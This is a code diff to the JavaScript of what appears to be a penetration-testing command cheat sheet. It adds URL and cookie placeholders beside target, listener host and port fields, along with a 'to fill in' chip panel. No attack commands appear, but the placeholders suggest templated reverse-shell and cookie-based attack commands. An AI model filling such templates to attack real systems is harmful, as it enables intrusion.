+const TOKEN=/(\{\{TARGET\}\}|\{\{LHOST\}\}|\{\{LPORT\}\}|\{\{URL\}\}|\{\{COOKIE\}\}|<[A-Za-z_]+>)/g;
+const KEYMAP={"{{TARGET}}":"target","{{LHOST}}":"lhost","{{LPORT}}":"lport","{{URL}}":"url","{{COOKIE}}":"cookie"};
 
 function renderCmd(tpl){
   const frag=document.createDocumentFragment();
@@ -383,7 +436,9 @@ function renderCmd(tpl){
 function buildPlain(tpl){
   return tpl.replace(/\{\{TARGET\}\}/g,val("target"))
             .replace(/\{\{LHOST\}\}/g,val("lhost"))
-            .replace(/\{\{LPORT\}\}/g,val("lport"));
+            .replace(/\{\{LPORT\}\}/g,val("lport"))
+            .replace(/\{\{URL\}\}/g,val("url"))
+            .replace(/\{\{COOKIE\}\}/g,val("cookie"));
 }
 
 const COPY_SVG='<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="11" height="11" rx="2"/><path d="M5 15V5a2 2 0 0 1 2-2h10"/></svg>';
@@ -422,6 +477,19 @@ PHASES.forEach(ph=>{
     btn.innerHTML=COPY_SVG+'<span class="lbl">copia</span>';
     row.appendChild(code); row.appendChild(btn);
 
+    // blocco "da compilare": segnaposto da adattare a mano
+    let fillEl=null;
+    if(cmd.f && cmd.f.length){
+      fillEl=document.createElement("div"); fillEl.className="fill";
+      const lbl=document.createElement("span"); lbl.className="fill-lbl"; lbl.textContent="da compilare";
+      fillEl.appendChild(lbl);
+      cmd.f.forEach(pair=>{
+        const chip=document.createElement("span"); chip.className="chip";
+        chip.innerHTML='<b>'+pair[0]+'</b>'+(pair[1]?'<span class="eg"> es. '+pair[1]+'</span>':'');
+        fillEl.appendChild(chip);
+      });
+    }
+
     const foot=document.createElement("div"); foot.className="card-foot";
     const note=document.createElement("div"); note.className="note"; note.textContent=cmd.n;
     foot.appendChild(note);
@@ -436,7 +504,9 @@ PHASES.forEach(ph=>{
     code.addEventListener("click",doCopy);
     btn.addEventListener("click",e=>{e.stopPropagation();doCopy();});
 
-    card.appendChild(row); card.appendChild(foot);
+    card.appendChild(row);
+    if(fillEl) card.appendChild(fillEl);
+    card.appendChild(foot);
     cards.appendChild(card);
   });
 
@@ -490,6 +560,8 @@ function bind(id,key){
 bind("in-target","target");
 bind("in-lhost","lhost");
 bind("in-lport","lport");
+bind("in-url","url");
+bind("in-cookie","cookie");
 
 /* ============ SEARCH ============ */
 const searchEl=document.getElementById("in-search");
